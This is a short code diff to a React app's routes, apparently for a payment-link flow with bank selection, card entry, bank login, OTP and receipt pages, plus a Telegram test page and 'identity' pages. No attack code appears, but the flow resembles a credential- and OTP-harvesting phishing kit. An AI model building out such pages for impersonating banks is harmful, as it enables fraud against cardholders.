@@ -84,17 +84,14 @@ const App = () => (
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/data" element={<PaymentData />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
-          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
-          <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
-          <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
+          {/* New payment flow: High-fidelity components */}
+          <Route path="/pay/:id/bank" element={<PaymentBankSelector />} />
+          <Route path="/pay/:id/card" element={<PaymentCardInput />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
-          {/* Payment routes with paymentId parameter */}
+          <Route path="/pay/:id/otp" element={<PaymentOTP />} />
+          {/* Support for flow with paymentId */}
           <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
           <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
-          <Route path="/pay/:id/receipt/:paymentId" element={<PaymentReceiptPage />} />
-          {/* Legacy routes (kept for backwards compatibility) */}
-          <Route path="/pay/:id/card" element={<PaymentCardForm />} />
-          <Route path="/pay/:id/otp" element={<PaymentOTP />} />
           <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
           <Route path="/telegram-test" element={<TelegramTestPage />} />
           {/* Dynamic Identity Pages */}
